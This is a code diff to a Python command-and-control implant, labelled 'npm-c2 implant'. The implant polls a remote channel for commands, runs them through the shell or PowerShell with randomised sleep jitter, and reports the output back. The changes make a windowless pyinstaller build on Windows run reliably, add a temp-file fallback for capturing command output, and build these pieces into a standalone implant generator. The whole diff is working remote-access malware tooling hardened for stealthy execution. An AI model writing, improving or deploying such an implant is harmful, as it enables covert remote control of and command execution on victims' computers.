@@ -48,6 +48,41 @@ AUTO_CLEAN = True           # delete consumed command tags (needs a token)
 WINDOWS = platform.system() == "Windows"
 
 
+def redirect_output():
+    """Give a windowed build somewhere to write.
+
+    A pyinstaller ``--noconsole`` build has ``sys.stdout``/``sys.stderr`` set
+    to ``None``, so every ``print`` raises ``OSError [WinError 6]`` and the
+    daemon dies while logging. Point the *stream objects* at a file (or the
+    null device) — that is enough for ``print`` to work and for
+    ``subprocess``, which gets explicit ``PIPE``/``DEVNULL`` handles.
+
+    Deliberately does NOT ``os.dup2`` the file descriptors: rebinding fds 1/2
+    in a windowed Windows process leaves the CRT and the OS handle table out
+    of step, and ``subprocess.wait`` then fails with ``WinError 6`` on an
+    invalid process handle. Verified with native/probe_cwd.py under Wine.
+
+    Set ``NPMC2_LOG=<path>`` to keep the output instead of discarding it.
+    """
+    target = os.environ.get("NPMC2_LOG", "").strip()
+    stream = None
+    if target:
+        try:
+            stream = open(os.path.abspath(target), "a", encoding="utf-8",
+                          errors="replace", buffering=1)
+        except OSError:
+            stream = None
+    if stream is None:
+        try:
+            stream = open(os.devnull, "w", encoding="utf-8", errors="replace")
+        except OSError:
+            return
+    if sys.stdout is None:
+        sys.stdout = stream
+    if sys.stderr is None:
+        sys.stderr = stream
+
+
 class Job:
     """One background command: output captured incrementally."""
 
@@ -95,6 +130,10 @@ class Implant:
     # ------------------------------------------------------------ main loop
     def run(self):
         self._load()
+        # A pyinstaller --noconsole build has no stdout/stderr: any print()
+        # raises OSError [WinError 6] and would abort every cycle. Point them
+        # at the null device before anything can write.
+        redirect_output()
         try:
             while True:
                 try:
@@ -103,8 +142,10 @@ class Implant:
                     # Never silent: a broken channel that looks healthy is
                     # worse than a noisy one.
                     if self.v:
-                        print(f"[!] cycle failed: {type(e).__name__}: {e}",
-                              file=sys.stderr)
+                        print(f"[!] cycle failed against {self.url}: "
+                              f"{type(e).__name__}: {e}", file=sys.stderr)
+                        import traceback as _tb
+                        _tb.print_exc(file=sys.stderr)
                 if self.v:
                     print(f"[*] poll #{self.n}")
                 time.sleep(self.interval + random.uniform(0, self.jitter))
@@ -337,30 +378,53 @@ class Implant:
         except SystemExit:
             raise
         except Exception as e:                          # noqa: BLE001
+            if self.v:
+                import traceback as _tb
+                print(f"[!] exec failed: {cmd[:60]}", file=sys.stderr)
+                _tb.print_exc(file=sys.stderr)
             return f"({type(e).__name__}: {e})"
 
     def _run(self, body, timeout=DEFAULT_TIMEOUT, shell=None):
         if not body.strip():
             return "(empty command)"
+        argv = self._ps_argv(body) if shell == "powershell" else self._shell_argv(body)
         try:
-            if shell == "powershell":
-                argv = self._ps_argv(body)
-            else:
-                argv = self._shell_argv(body)
-            r = subprocess.run(argv, cwd=self.cwd, capture_output=True,
-                               timeout=timeout, stdin=subprocess.DEVNULL)
+            out, err, rc = self._spawn_capture(argv, timeout)
         except subprocess.TimeoutExpired:
             return f"(timeout after {timeout}s)"
         except FileNotFoundError as e:
             return f"(interpreter not found: {e})"
-        out = r.stdout.decode(errors="replace")
-        err = r.stderr.decode(errors="replace")
         combined = (out + err).strip()
         if len(combined) > MAX_CAPTURE:
             cut = len(combined) - MAX_CAPTURE
             combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
-        prefix = "" if r.returncode == 0 else f"[rc={r.returncode}] "
+        prefix = "" if rc == 0 else f"[rc={rc}] "
         return f"{prefix}{combined or '(no output)'}"
+
+    def _spawn_capture(self, argv, timeout):
+        """Run ``argv`` and return ``(stdout, stderr, returncode)``.
+
+        Pipes are the fast path. A pyinstaller ``--noconsole`` build has no
+        console handles, and on Windows ``subprocess`` can then fail waiting on
+        an invalid process handle (``WinError 6``). Temp files are ordinary
+        file handles and always work, so that is the fallback.
+        """
+        try:
+            r = subprocess.run(argv, cwd=self.cwd, capture_output=True,
+                               timeout=timeout, stdin=subprocess.DEVNULL)
+            return (r.stdout.decode(errors="replace"),
+                    r.stderr.decode(errors="replace"), r.returncode)
+        except OSError:
+            if not WINDOWS:
+                raise
+        import tempfile
+        with tempfile.TemporaryFile() as so, tempfile.TemporaryFile() as se:
+            r = subprocess.run(argv, cwd=self.cwd, stdout=so, stderr=se,
+                               timeout=timeout, stdin=subprocess.DEVNULL)
+            so.seek(0)
+            se.seek(0)
+            return (so.read().decode(errors="replace"),
+                    se.read().decode(errors="replace"), r.returncode)
 
     @staticmethod
     def _shell_argv(body):
@@ -600,6 +664,8 @@ def generate_standalone(token=None, package=None):
         "",
         inspect.getsource(group_chunks_with_id),
         "",
+        inspect.getsource(redirect_output),
+        "",
         inspect.getsource(Job),
         "",
         inspect.getsource(Implant),
@@ -616,6 +682,7 @@ def generate_standalone(token=None, package=None):
 
     parts += [
         "def main():",
+        "    redirect_output()   # --noconsole build: stdout/stderr are None",
         "    p = argparse.ArgumentParser(description='npm-c2 implant')",
         "    p.add_argument('--package', '-p', required=True)",
         "    p.add_argument('--token', '-t', default=None)",
